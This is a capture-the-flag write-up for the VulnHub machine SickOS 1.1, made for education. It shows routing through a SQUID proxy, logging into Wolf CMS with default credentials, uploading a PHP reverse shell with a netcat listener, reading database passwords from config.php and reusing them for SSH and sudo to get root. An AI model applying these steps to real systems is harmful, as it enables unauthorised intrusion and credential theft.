# 🖥️ SickOS 1.1 — VulnHub

| Field | Details |
|---|---|
| 🏷️ Machine | SickOS 1.1 |
| 🌐 Platform | VulnHub |
| 🎯 Difficulty | Medium |
| 🧠 Topics | SQUID Proxy, WolfCMS, PHP Reverse Shell, Credential Reuse, sudo PrivEsc |
| 👤 Author | [Sandeep Prasad Chowdhury](https://github.com/chowdhurysandeep) |
| 🔗 Source | https://www.vulnhub.com/entry/sickos-11,132/ |

---

## 📌 Summary

SickOS 1.1 requires routing all traffic through a SQUID proxy to reach the hidden web server. The entry point is a Wolf CMS installation with default credentials — a PHP reverse shell is uploaded via the CMS file manager. Credentials found in `config.php` allow SSH access, and `sudo su` with the same password grants root.

---

## 🔍 1. Reconnaissance & Enumeration

### Network Discovery

```bash
netdiscover
```

Target IP: **<TARGET_IP>**

### Port Scan

```bash
nmap <TARGET_IP>
```

**Open Ports:**

| Port | Service |
|---|---|
| 22 | SSH |
| 3128 | SQUID HTTP Proxy |
| 8080 | HTTP Proxy (Closed) |

> Web server is only accessible **through the SQUID proxy** on port 3128.

---

## 🔎 2. Web Enumeration via Proxy

Configure Firefox proxy: `<TARGET_IP> : 3128`

Browse to `http://<TARGET_IP>` → displays **"BLEHHH!!!"**

### robots.txt

```
User-agent: *
Disallow: /
Dissalow: /wolfcms
```

Hidden directory found: `/wolfcms`

---

## 💥 3. Exploitation

### Wolf CMS — Default Credentials

Browse to `http://<TARGET_IP>/wolfcms/?/admin/`

Try default credentials:

```
Username: admin
Password: admin
```

✅ **Login successful**

### PHP Reverse Shell Upload

Inside Wolf CMS → **Files** section → **Upload file**

1. Download PHP reverse shell from [pentestmonkey](https://github.com/pentestmonkey/php-reverse-shell)
2. Edit the shell — set your Kali IP and port 4444
3. Upload via the CMS Files panel

Shell is accessible at:

```
http://<TARGET_IP>/wolfcms/public/php-reverse-shell.php
```

Start listener:

```bash
nc -l -p 4444
```

Click the uploaded PHP file to trigger the shell.

✅ **Shell obtained as `www-data`**

---

## 🔑 4. Post-Exploitation — Credential Discovery

```bash
cd /var/www/wolfcms
cat config.php
```

**Database credentials found:**

```php
define('DB_USER', 'root');
define('DB_PASS', 'john@123');
```

---

## ⬆️ 5. Privilege Escalation

### SSH with Discovered Credentials

```bash
ssh sickos@<TARGET_IP>
# Password: john@123
```

✅ **SSH login successful**

### Escalate to Root

```bash
sudo su
# Password: john@123
```

✅ **Root shell obtained**

---

## 🚩 6. Flag

```bash
cd /root
ls -la
cat a0216ea4d51874464078c618298b1367.txt
```

```
If you are viewing this!!
ROOT!
You have Succesfully completed SickOS1.1.
Thanks for Trying
```

---

## 🔒 7. Vulnerabilities Identified

| Vulnerability | Severity |
|---|---|
| Default CMS credentials (admin/admin) | High |
| Unrestricted file upload in CMS | Critical |
| Credentials stored in config file | High |
| Weak sudo configuration (same password) | Critical |

---

## 📚 8. Lessons Learned

- Always scan for proxy ports — SQUID can hide entire web servers
- Default credentials on CMS installations are extremely common
- Never store plaintext database passwords in world-readable config files
- Using the same password for DB, SSH, and sudo is a critical mistake

---

## 🛠️ Tools Used

- `netdiscover` — network discovery
- `nmap` — port scanning
- Firefox proxy — web enumeration via SQUID
- PHP reverse shell (pentestmonkey)
- `netcat` — reverse shell listener
- `ssh` — remote access

---

*Writeup by [Sandeep Prasad Chowdhury](https://github.com/chowdhurysandeep) — for educational purposes only.*
